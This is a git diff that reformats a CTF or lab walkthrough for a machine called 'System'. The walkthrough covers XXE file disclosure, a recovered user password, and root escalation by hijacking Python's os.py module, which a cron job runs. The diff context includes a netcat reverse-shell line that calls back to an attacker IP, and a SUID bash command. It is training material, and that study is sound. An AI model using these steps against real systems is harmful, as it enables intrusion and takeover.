@@ -1,11 +1,11 @@
 ---
-title: System 1
-layout: system 1
+title: System
+layout: default
 ---
 
 ## Reconnaissance
 
-### Step 1: Enumerate my network interface and my IP
+### Step 1: Enumerate the network interface and IP
 
 ```bash
 ifconfig
@@ -62,15 +62,15 @@ PORT   STATE SERVICE REASON
 
 Let´s register
 
-![[Pasted image 20250217123138.png]]
+![](/assets/images/Pasted_image_20250217123138.png)
 
 ### Step 5: Intercept with BurpSuite
 
-![[Pasted image 20250217123416.png]]
+![](/assets/images/Pasted_image_20250217123416.png)
 
 In Repetar Tab send the request
 
-![[Pasted image 20250217123522.png]]
+![](/assets/images/Pasted_image_20250217123522.png)
 
 As that in the response is shown the email...
 
@@ -133,7 +133,7 @@ Let´s note thre is an user david: `david:x:1000:1000::/home/david:/bin/bash`
 
 *I. Storage the Request in RAW format in `xxe_rq.txt`:*
 
-![[Pasted image 20250217124738.png]]
+![](/assets/images/Pasted_image_20250217124738.png)
 
 In console or using vim:
 
@@ -175,11 +175,11 @@ ffuf -ic -c -request-proto http -request xxe_rq.txt -w /usr/share/seclists/Disco
 
 *III. Let´s go back to Burp Suite and read `.viminfo`, it might have info of user:*
 
-![[Pasted image 20250217125846.png]]
+![](/assets/images/Pasted_image_20250217125846.png)
 
 *IV. Again in Burp Suite:*
 
-![[Pasted image 20250217130154.png]]
+![](/assets/images/Pasted_image_20250217130154.png)
 
 **Key points:** 
 - Pass user David: `h4ck3rd4v!d`
@@ -230,8 +230,7 @@ To identify potential opportunities for privilege escalation, we can enumerate t
 
 To monitor running processes on the target system, we can use `pspy64`, a powerful tool designed to observe background processes without requiring root privileges. Since the target machine does not have this tool installed, we will transfer it by setting up a temporary file server using Python.
 
->[!Attention]
->Mount the server in thesame location of `pspy64`
+**Attention:** Mount the server in thesame location of `pspy64`
 
 With `find` to serach in case we do not know where we have it.
 
@@ -246,8 +245,7 @@ find / -name "pspy64" 2>/dev/null
 # In my case
 ```
 
->[!Note]
->in case we don't have it we can download it from https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
+**Note:** in case we don't have it we can download it from https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
 
 Run server:
 
@@ -327,8 +325,7 @@ os.system("chmod u+s /bin/bash")
 <SNIP>
 ```
 
->[!Bug] Issue
-The error occurs because the `os` module is imported, but the `system` function is called incorrectly. The correct usage should reference the imported `system` function directly, without the `os.` prefix.
+**Issue:** The error occurs because the `os` module is imported, but the `system` function is called incorrectly. The correct usage should reference the imported `system` function directly, without the `os.` prefix.
 
 Since David does not have the necessary permissions to modify the file and fix the syntax error, we must explore alternative methods to achieve our objective.
 We can consider an alternative approach by **modifying the `os.py` module** itself. This module is part of Python's standard library and contains the `system` function used in the script.
@@ -373,8 +370,7 @@ subprocess.call("nc " + "192.168.0.103 8080 -e /bin/bash", shell=True)
 - The `subprocess` module is part of Python's standard library and allows you to spawn new processes, interact with their input/output/error pipes, and obtain their return codes.
 - `shell=True` This argument tells the `subprocess.call` function to execute the command through the system's shell.
 
->[!Note]
->To avoid breaking the `os.py` file it is recommended to put these lines at the end so that they are executed after the file has been loaded.
+**Note:** To avoid breaking the `os.py` file it is recommended to put these lines at the end so that they are executed after the file has been loaded.
 
 Let´s go a our terminañ:
 
@@ -403,6 +399,6 @@ root.txt
 
 ---
 
->[!tip] Congratulations!
-You explored an XXE vulnerability to access local files and leveraged a privilege misconfiguration to escalate access by hijacking a Python script executed via a cron job.
-Thank you for completing this challenge!
+**Congratulations!**
+**You explored an XXE vulnerability to access local files and leveraged a privilege misconfiguration to escalate access by hijacking a Python script executed via a cron job.**
+**Thank you for completing this challenge!**
